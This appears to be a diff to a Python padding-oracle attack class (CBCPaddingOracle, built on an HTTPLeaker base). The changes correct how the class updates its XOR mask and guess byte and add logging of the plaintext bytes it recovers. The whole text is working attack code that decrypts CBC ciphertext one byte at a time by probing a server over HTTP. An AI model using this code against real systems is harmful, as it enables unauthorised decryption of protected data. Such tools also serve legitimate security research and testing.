@@ -67,19 +67,22 @@ class CBCPaddingOracle(HTTPLeaker):
         of the ciphertext.
         '''
         padding = self.state['idx']
-        xored_new_padding = xor(chr(padding), chr(padding + 1))
+        mask = self.state['mask']
 
+        # the mask acts on the evil block
         block_start_offset, block_end_offset = self.evil_block_range
         block_start_offset = block_end_offset - padding
 
-        mask = self.state['mask']
+        xored_new_padding = xor(chr(padding), chr(padding + 1))
+
         self.logger.debug('mask before %s' % hexify(mask))
         self.state['mask'] = mask[:block_start_offset] + xor(mask[block_start_offset:block_end_offset], xored_new_padding) + mask[block_end_offset:]
 
-        self.logger.debug('mask after   %s' % hexify(self.state['mask']))
+        self.logger.debug('mask after  %s' % hexify(self.state['mask']))
 
         '''we update the index of the byte we are looking for'''
         self.state['idx'] += 1
+        self.state['mask_byte'] = '\x00'
 
     def update(self):
         state = self.state['state']
@@ -104,7 +107,6 @@ class CBCPaddingOracle(HTTPLeaker):
                 self.state['idx']   = padding # idx will memorize the last value of padding correctly decoded
 
                 self.state['mask'] = '\x00' * self.state['total_length']
-                self.state['mask_byte'] = '\x00'
 
                 self.update_mask()
 
@@ -125,10 +127,13 @@ class CBCPaddingOracle(HTTPLeaker):
                 self.state['mask_byte'] = chr(b)
                 self.logger.debug('trying with mask byte %s' % hexify(self.state['mask_byte']))
             elif file:
-                self.logger.info('with %s it\'s ok' % self.state['mask_byte'])
-                self.update_mask()
-                raise
+                self.logger.info('with 0x%s it\'s ok' % hexify(self.state['mask_byte']))
+                self.logger.info('decoded -> %s' % xor(chr(self.state['idx']), self.state['mask_byte']))
 
+                if self.state['idx'] == self.state['block_length']:
+                    raise
+
+                self.update_mask()
 
     def get_requests_method(self):
         return 'GET'
@@ -167,11 +172,14 @@ class CBCPaddingOracle(HTTPLeaker):
             # block
             self.logger.info('probing %d-th byte' % self.state['idx'])
 
-            ciphertext = xor(ciphertext, self.state['mask'])
+            mask = self.state['mask']
 
+            # update the mask with the new guessing byte
             start, end = self.evil_block_range
             idx = end - self.state['idx']
-            ciphertext = ciphertext[:idx] + self.state['mask_byte'] + ciphertext[idx + 1:]
+            self.state['mask'] = mask[:idx] + self.state['mask_byte'] + mask[idx + 1:]
+
+            ciphertext = xor(ciphertext, self.state['mask'])
 
         return {
             'c': hexify(ciphertext),
